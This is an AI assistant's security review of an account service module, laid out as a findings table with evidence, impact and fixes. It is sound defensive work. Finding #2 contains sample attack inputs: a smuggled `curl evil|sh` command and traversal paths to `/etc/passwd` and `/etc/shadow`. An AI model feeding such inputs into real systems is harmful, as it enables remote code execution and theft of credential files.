I reviewed `account_service.py`. Everything is confirmed by reading the code unless it's marked otherwise. I didn't look at callers or the session middleware because they aren't in the repo, and I changed no code.

| # | Finding | Evidence (file:line) | Impact | Priority | Proposed Fix | Risk |
|---|---------|---------------------|--------|----------|--------------|------|
| 1 | **SQL injection**: `username` is put straight into the query string with an f-string. | `account_service.py:34` | Anyone can read the whole DB. It also allows a **login bypass**: a `UNION SELECT` can return any `role` plus a password hash the attacker computed. That works because the hashing key is hardcoded (#3). | Critical | Use a `?` placeholder, as `find_by_id` already does (`:46`). | Low |
| 2 | **Command injection and path traversal in the export**: `filename` goes into a `shell=True` command. `os.path.join` also throws away `EXPORT_DIR` when `filename` is an absolute path or contains `../`. | `:119-125`, `:126` | `filename="x; curl evil\|sh"` runs code on the server (RCE). `filename="/etc/passwd"` or `"../../etc/shadow"` lets someone read any file the service can access. | Critical | Pass an argument list without `shell=True`. Check `filename` against a whitelist pattern such as `^[\w.-]+$`, or generate it on the server. Check that `realpath(destination)` stays inside `EXPORT_DIR`. | Low |
| 3 | **Hardcoded live secret**: `SIGNING_KEY = "sk_live_..."` is in the source. | `:19` | Anyone with the source has the key, and it's in every copy of the code. It is also the pepper for every password hash, which makes #1 and #5 worse. | Critical | Rotate the key now and load it from the environment or a secret manager. Rotating it breaks every existing password hash, so plan a re-hash migration. | Medium (migration) |
| 4 | **Plaintext password written to the logs** when a login succeeds. | `:60-65` | Every valid credential ends up in log files and log pipelines. | Critical | Remove `password` from the log call. Purge the existing logs. | Low |
| 5 | **IDOR in `update_profile`**: `session_user_id` is never checked, so anyone can update any `target_user_id`. | `:83-100` | Any user can change another user's `email`, then take over the account through password reset. | Critical | Require `session_user_id == target_user_id` or an admin role, following `deactivate_account` (`:157-161`). | Low |
| 6 | **IDOR in `get_profile`**: there's no ownership or role check. | `:103-114` | Anyone can list other users' email, role and timezone by trying IDs one after another. | High | Add the same authorization check as in #5. | Low |
| 7 | **No authorization on `export_account_data`**: any `user_id` is accepted, and nothing enforces that it's an `int`. | `:117-121` | One user can export another user's data. Passing a string for `user_id` is a second way to do #2. | High | Pass the session user, check ownership or admin role, and cast with `int(user_id)`. | Low |
| 8 | **Weak password hashing**: one round of SHA-256 with a global pepper and no per-user salt. | `:72-75` | Fast to crack offline with a GPU. Identical passwords produce identical hashes. | High | Use argon2id or bcrypt with a per-user salt. | Medium (migration) |
| 9 | **Hash compared with `==`**, which is not constant-time. | `:59` | Timing side channel. It's hard to exploit, but the fix costs nothing. | Low | `hmac.compare_digest`, or the verify function from #8. | Low |
| 10 | **`list_recent_signups` limit can be bypassed**: the code caps large values but not negative ones, and SQLite reads `LIMIT -1` as no limit. There's no authorization check either. | `:132-139` | Anyone can dump every username. If this endpoint isn't meant to be admin-only, it lets people enumerate users. | Medium | Clamp with `max(1, min(limit, 1000))` and bound `days`. Add an admin check if the endpoint is meant to be admin-only (I can't tell from this file). | Low |
| 11 | **Email is never validated on update**: `normalize_email` exists but `update_profile` doesn't call it. The regex also accepts `<`, `>` and `"`. | `:85-95`, `:150` | Bad email values get stored. Stored XSS is possible if some view renders the email without escaping (HYPOTHESIS: depends on the frontend). | Medium | Call `normalize_email` inside `update_profile` and tighten the regex. | Low |
| 12 | **Export ignores failure and may return a leftover file**: with `check=False`, a failed run still reaches `open(destination)`. | `:124-127` | If a file with that name already exists, the caller gets the old file, which could be another user's export. | Medium | Use `check=True`, write to a unique temp name, and delete it after reading. | Low |
| 13 | **Log injection**: the raw `username` goes into the logs. | `:61-62`, `:68` | Newlines in it can forge log entries. | Low | Escape or encode the username before logging. | Low |
| 14 | **`find_by_username` returns `password_hash`** to callers. | `:34-36` | The hash could reach an API response if a caller serializes the dict (NOT VERIFIED: no callers in the repo). | Low | Use a separate internal-only query for authentication. | Low (contract) |
| 15 | **Deactivated actors aren't rejected**: `deactivate_account` doesn't check whether the actor is `active`. | `:157-161` | A deactivated admin could still deactivate other accounts (HYPOTHESIS: depends on whether the middleware rejects inactive sessions). | Low | Select `active` and reject the actor if it's 0. | Low |

**Root cause behind #5, #6, #7 and #10:** the module docstring (`:4-5`) assumes that passing the session middleware is enough. That middleware checks who the user is, not what they're allowed to touch. Only `deactivate_account` actually checks the caller against the target.

**Fix first:** #1, #2, #4 and #5 are each exploitable on their own, and #3 needs rotating today. Fixing #3 and #8 changes how passwords are stored, which means a data migration and a reviewer looking at the change before it goes in.
